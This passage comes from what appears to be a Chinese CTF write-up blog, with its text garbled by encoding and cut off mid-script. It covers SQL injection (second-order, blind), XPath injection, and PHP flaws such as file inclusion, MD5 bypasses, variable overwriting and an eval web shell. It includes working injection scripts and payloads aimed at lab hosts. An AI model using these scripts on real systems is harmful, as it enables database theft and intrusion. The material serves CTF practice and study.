&#x27;&#x27;&#x27;é‡æ–°å‘é€ä¸¤æ¬¡è¯·æ±‚&#x27;&#x27;&#x27; head[&quot;X-Forwarded-For&quot;] = &quot;penson&quot; requests.get(url, headers=head) r = requests.get(url, headers=head) if &quot;Last Ip: 1 &quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32 or mid == 127: break flag += chr(mid) print(flag)print(flag) æ‹“å±• æ›´å¤šçš„é—­åˆæ–¹å¼ 1234567&#39; or (payload) or &#39;&#39; and (payload) and &#39;&#39; or (payload) and &#39;&#39; or (payload) and &#39;&#x3D;&#39;&#39;* (payload) *&#39;&#39; or (payload) and &#39;&quot; â€“ (payload) â€“ &quot; è¿˜æœ‰ä¸€ç§payload 10&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0 æ³¨æ„ï¼šä¸€æ¬¡ä¸èƒ½è¯»å¤ªå¤šä½ï¼Œä¸ç„¶10è¿›åˆ¶ä¼šç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºï¼Œå°±æ— æ³•è½¬æ¢å›åŸå­—ç¬¦ä¸²äº†ã€‚ ç½‘é¼æ¯2018 Unfinished è€ƒç‚¹ äºŒæ¬¡æ³¨å…¥ ä¸¤æ¬¡Hexç¼–ç  è§£é¢˜ ç™»é™†çš„æ—¶å€™ç”¨åˆ°çš„æ˜¯é‚®ç®±å’Œå¯†ç ï¼Œè€Œæ³¨å†Œçš„æ—¶å€™è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œè€Œè¿™ä¸ªç”¨æˆ·åå´åœ¨ç™»é™†åæ˜¾ç¤ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨æˆ·åè¿™é‡Œå¯èƒ½å­˜åœ¨ äºŒæ¬¡æ³¨å…¥ã€‚ æ³¨å†ŒæˆåŠŸï¼Œä¼šå¾—åˆ° 302 çŠ¶æ€ç å¹¶è·³è½¬è‡³ login.php ï¼›å¦‚æœæ³¨å†Œå¤±è´¥ï¼Œåªä¼šè¿”å› 200 çŠ¶æ€ç ã€‚æ‰€ä»¥æ„é€  payload å¦‚ä¸‹ï¼š 1email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test åœ¨è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ä¸¤æ¬¡hexåŠ å¯†ï¼š ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºçš„æ˜¯ï¼Œå¦‚æœå­—ç¬¦ä¸²hexåçš„å€¼ä¸­åŒ…å«å­—æ¯ï¼Œåœ¨ä¸0ç›¸åŠ ååªèƒ½æ˜¾ç¤ºå­—æ¯ä¹‹å‰çš„æ•°å­—ä¸0ç›¸åŠ çš„ç»“æœã€‚ä¸¤æ¬¡hexç¼–ç å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ç„¶åè¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“æ•°æ®è¿›è¿‡ ä¸¤æ¬¡hex åï¼Œä¼šå¾—åˆ°è¾ƒé•¿çš„ä¸€ä¸²åªå«æœ‰æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œå½“è¿™ä¸ªé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œå°±æ— æ³•è¿˜åŸæœ¬èº«çš„å­—ç¬¦ä¸²ã€‚ æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ substr æ¯æ¬¡å–10ä¸ªå­—ç¬¦é•¿åº¦ä¸ â€˜0â€™ ç›¸åŠ ï¼Œè¿™æ ·å°±ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚ä½†æ˜¯è¿™é‡Œä½¿ç”¨é€—å· , ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç±»ä¼¼ substr(â€˜testâ€™ from 1 for 10) è¿™ç§å†™æ³•æ¥ç»•è¿‡ï¼Œå…·ä½“è·å– flag çš„payloadå¦‚ä¸‹ï¼š 10&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0 æ³¨å…¥è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding=utf-8import requestsimport re, binasciiimport sysurl = &quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;sql = &quot;select * from flag&quot;email = [&quot;test0&quot; + str(i) + &quot;@aa.aa&quot; for i in range(0, 24)] # è¿™é‡Œæ¬¡æ•°å¯ä»¥é€šè¿‡sqlçˆ†ç ´flagé•¿åº¦å¾—åˆ°ï¼Œæˆ–è€…ä¹Ÿå¯fuzzdef register(email, offset): payload = &quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;.format(sql, str(1 + offset * 10)) data = &#123; &quot;email&quot;: email, &quot;username&quot;: payload, &quot;password&quot;: &quot;test&quot; &#125; req = requests.post(url + &quot;/register.php&quot;, data=data)def login(email): data = &#123; &quot;email&quot;: email, &quot;password&quot;: &quot;test&quot; &#125; r = requests.post(url + &quot;/login.php&quot;, data, allow_redirects=True) pattern = &#x27;&lt;span class=\\&quot;user-name\\&quot;&gt;\\s*(\\d&#123;1,10&#125;)\\s*&lt;&#x27; return re.findall(pattern, r.text)[0]if __name__ == &#x27;__main__&#x27;: raw = &#x27;&#x27; for email, offset in zip(email, range(0, len(email))): register(email, offset) test = login(email) print(test) raw += test sys.stdout.write(&quot;[-] Double Hex : -&gt; %s &lt;-\\r&quot; % (raw)) sys.stdout.flush() print(&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;.format(raw)) BlackWatch å…¥ç¾¤é¢˜ Web è€ƒç‚¹ MySQLç›²æ³¨ è§£é¢˜ ç›²æ³¨è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728import requestsurl = &quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;proxies = &#123; &quot;http&quot;: None, &quot;https&quot;: None&#125;name = &quot;&quot;i = 0while True: head = 32 tail = 127 i += 1 while head &lt; tail: mid = head + tail &gt;&gt; 1 # payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid) # payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid) payload = &quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot; % (i, mid) r = requests.get(url + payload, proxies=proxies) # print(url+payload) # print(r.json()) if &quot;Yunen&quot; in str(r.json()): head = mid + 1 else: tail = mid if head != 32: name += chr(head) print(name) else: break NPUCTF2020 ezlogin è€ƒç‚¹ Xpathæ³¨å…¥ è§£é¢˜ payload å«ä¹‰ â€™ or count(/)=1 or '1 åˆ¤æ–­æœ‰å‡ ä¸ªæ ¹èŠ‚ç‚¹ â€™ or string-count(name(/*[1]))=1 or '1 è·å–æ ¹èŠ‚ç‚¹é•¿åº¦ 'or substring(name(/*[1]), 1, 1)=â€˜aâ€™ or '1 è·å–å†…å®¹ ç›²æ³¨è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637# -*- coding: UTF-8 -*-import requestsimport reimport stringimport timeurl = &#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;sess = requests.session()strs = string.digits + string.ascii_lettersheaders = &#123; &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;find = re.compile(&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;)result = &#x27;&#x27;for i in range(50): for j in strs: r = sess.post(url=url) token = find.findall(r.text) time.sleep(1) if token: # æ ¹èŠ‚ç‚¹root # data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0]) # rootå­èŠ‚ç‚¹accounts # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # accountså­èŠ‚ç‚¹user # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # userå­èŠ‚ç‚¹id, username, password # data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( # data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format( i, j, token[0]) res = sess.get(url=url, headers=headers, data=data) if &#x27;éæ³•æ“ä½œ&#x27; in res.text: result += j print(result) break æœ€åå¯ä»¥åˆ¤æ–­æ ¼å¼ä¸ºï¼š 123456789101112&lt;root&gt; &lt;accounts&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;gtfly123&lt;/username&gt; &lt;password&gt;e10adc3949ba59abbe56e057f20f883e&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;&lt;/id&gt; &lt;username&gt;adm1n&lt;/username&gt; &lt;password&gt;cf7414b5bdb2e65ee43083f4ddbc4d9f&lt;/password&gt; &lt;/user&gt; passwordæ— æ³•è§£å¯†ï¼Œä½¿ç”¨adm1n gtfly123ç™»å½•ç«™ç‚¹ã€‚ æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæç¤ºï¼šflag is in /flag å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡ 1admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag SUCTF2018 MultiSQL PwnThyBytes2019 bBaby_SQL October 2019 Twice SQL Injection HITCON 2017 SQL So Hard","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"SQLæ³¨å…¥","slug":"CTF/SQLæ³¨å…¥","permalink":"http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡","date":"2020-08-18T09:57:57.000Z","path":"Web_security/ctf_writeup/4.buuctfåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡/","text":"BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡ [HCTF2018]WarmingUp è€ƒç‚¹ ä»£ç å®¡è®¡ è§£é¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; https://www.cnblogs.com/h3zh1/p/12853478.html payloadï¼š 1http:&#x2F;&#x2F;f3a0386f-ebf6-4b35-8a60-87de301e158a.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg æˆ‘æ„Ÿè§‰ä¸Šé¢è¿™ä¸ªåˆ†ææœ‰ç‚¹é—®é¢˜ï¼Œè¿™ä¸ªpayloadåˆ°äº†ç¬¬23è¡Œçš„ifè¯­å¥å°±ç›´æ¥returnï¼Œæ²¡æœ‰åé¢çš„ä»£ç å•¥äº‹äº†ã€‚ [æå®¢å¤§æŒ‘æˆ˜2019]PHP TODO BJDCTF2020 Easy MD5 è€ƒç‚¹ PHP MD5 è§£é¢˜ ç¬¬ä¸€å…³ payloadï¼šffifdyop åˆ†ææ–‡ç« ï¼šhttps://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9 123content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚ ç¬¬äºŒå…³ MD5 ç¢°æ’ ç¬¬ä¸‰å…³ 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; ä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚ æ‹“å±• 1234if((string)$_POST[&#x27;param1&#x27;]!==(string)$_POST[&#x27;param2&#x27;] &amp;&amp; md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; die(&quot;success!&quot;);&#125; https://xz.aliyun.com/t/2232 1param1&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED MRCTF2020 Ez_bypass è€ƒç‚¹ MD5ç»•è¿‡ is_numericç»•è¿‡ è§£é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839include &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125; æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ã€‚ ç¬¬ä¸€ä¸ªä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚ ç¬¬äºŒä¸ªä¸ºis_numericå‡½æ•°å¼±ç±»å‹ï¼Œç”¨1234567abcç»•è¿‡ã€‚ BJDCTF2020 Mark loves cat è€ƒç‚¹ Gitæºç æ³„éœ² å˜é‡è¦†ç›– è§£é¢˜ å…³é”®åœ¨äºè¦è®¤è¯†åˆ°exit()ä¹Ÿæ˜¯å¯ä»¥æ˜¯è¾“å‡ºçš„ 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; å…ˆæ¥åˆ†æä¸‰ä¸ªifè¯­å¥ï¼š ç¬¬ä¸€ä¸ªifè¯­å¥ï¼š 12345foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125; é”®åä¸ºflagçš„é”®å€¼ç»å¯¹ç­‰äºå…¶ä¸­æŸä¸€ä¸ªé”®å€¼ï¼Œå¹¶ä¸”é”®åä¸èƒ½æœ‰flagã€‚å‰åç›¸äº’çŸ›ç›¾ï¼Œè¿›ä¸å»è¿™ä¸ªåˆ¤æ–­ã€‚ ç¬¬äºŒä¸ªifè¯­å¥ï¼š 123if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125; ä¸å­˜åœ¨GETå‹çš„flagå‚æ•°ï¼Œä¹Ÿä¸å­˜åœ¨POSTå‹çš„flagå‚æ•°ã€‚ ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼š 123if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125; POSTå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagï¼ŒGETå‹flagå‚æ•°å€¼ç»å¯¹ç­‰äºflagã€‚ å¦‚æœæƒ³é€šè¿‡ç¬¬äºŒä¸ªifè¯­å¥æ¥è¾“å‡ºflagçš„è¯ï¼Œå°±è¦å»è¦†ç›–$flagï¼Œå³$yds=$flagï¼š 123foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125; é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥GETä¼ å‚ï¼š 1&#x2F;index.php?yds&#x3D;flag ç›¸å½“äº$yds=$flagã€‚ å¦‚æœæƒ³é€šè¿‡ç¬¬ä¸‰ä¸ªifè¯­å¥æ¥è¾“å‡ºflagï¼Œå°±è¦å»è¦†ç›–$isï¼Œå³$is=$flagï¼Œå¹¶ä¸”GETä¸­è¦æœ‰flagå‚æ•°ï¼š 1&#x2F;index.php?is&#x3D;flag&amp;flag&#x3D;flag GKCTF2020 CheckIN è€ƒç‚¹ disable_functionç»•è¿‡ è§£é¢˜ 12345678910111213141516171819&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); çœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°ç¦ç”¨äº†å¾ˆå¤šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚ å†™ä¸€ä¸ªshellç”¨èšå‰‘è¿æ¥ï¼Œeval($_POST[123]);ï¼Œç»è¿‡base64ç¼–ç æ˜¯ZXZhbCgkX1BPU1RbMTIzXSk7 æµè§ˆæ ¹ç›®å½•å‘ç°è¦ç”¨readflagè¯»å–flagæ–‡ä»¶ï¼Œä¸Šä¼ php7-diable_function-bypass Pocè‡³/tmpç›®å½•ä¸‹ï¼Œç„¶åç”¨includeåŒ…å«è¯¥æ–‡ä»¶ï¼š GWCTF2019 æ¯ç‡¥çš„æŠ½å¥– è€ƒç‚¹ è§£é¢˜ æŸ¥çœ‹æºä»£ç æœ‰ä¸€æ®µJSä»£ç  123456789101112131415161718192021222324252627282930313233343536$(document).ready(function()&#123; $(&quot;#div1&quot;).load(&quot;check.php #p1&quot;); $(&quot;.close&quot;).click(function()&#123; $(&quot;#myAlert&quot;).hide(); &#125;); $(&quot;#button1&quot;).click(function()&#123; $(&quot;#myAlert&quot;).hide(); guess=$(&quot;input&quot;).val(); $.ajax(&#123; type: &quot;POST&quot;, url: &quot;check.php&quot;, data: &quot;num=&quot;+guess, success: function(msg)&#123; $(&quot;#div2&quot;).append(msg); alertmsg = $(&quot;#flag&quot;).text(); if(alertmsg==&quot;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&quot;)&#123; $(&quot;#myAlert&quot;).attr(&quot;class&quot;,&quot;alert alert-warning&quot;); if($(&quot;#new&quot;).text()==&quot;&quot;) $(&quot;#new&quot;).append(alertmsg); &#125; else&#123; $(&quot;#myAlert&quot;).attr(&quot;class&quot;,&quot;alert alert-success&quot;); if($(&quot;#new&quot;).text()==&quot;&quot;) $(&quot;#new&quot;).append(alertmsg); &#125; &#125; &#125;); $(&quot;#myAlert&quot;).show(); $(&quot;#new&quot;).empty(); $(&quot;#div2&quot;).empty(); &#125;);&#125;); å†å»çœ‹check.php 1234567891011121314151617181920212223242526272829ODuHdhCHWY&lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123; if($_POST[&#x27;num&#x27;]===$str)&#123;x echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;; &#125;&#125;show_source(&quot;check.php&quot;); BJDCTF2020 EasySearch è€ƒç‚¹ MD5æˆªæ–­éªŒè¯ è§£é¢˜ ç”¨dirmapæ‰«ä¸€éï¼Œå‘ç°index.php.swp 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; ä»£ç ç¬¬14è¡Œæ˜æ˜¾æ˜¯è€ƒå¯ŸMD5æˆªæ–­è®¤è¯ï¼Œç›´æ¥ç”¨è„šæœ¬çˆ†ç ´ å‚è€ƒï¼šhttps://www.cnblogs.com/yesec/p/11297568.html 12345678910111213141516171819202122from multiprocessing.dummy import Pool as tpimport hashlibknownMd5 = &#x27;6d0bc1&#x27; #å·²çŸ¥çš„md5æ˜æ–‡def md5(text): return hashlib.md5(str(text).encode(&#x27;utf-8&#x27;)).hexdigest()def findCode(code): key = code.split(&#x27;:&#x27;) start = int(key[0]) end = int(key[1]) for code in range(start, end): if md5(code)[0:6] == knownMd5: print code breaklist=[] for i in 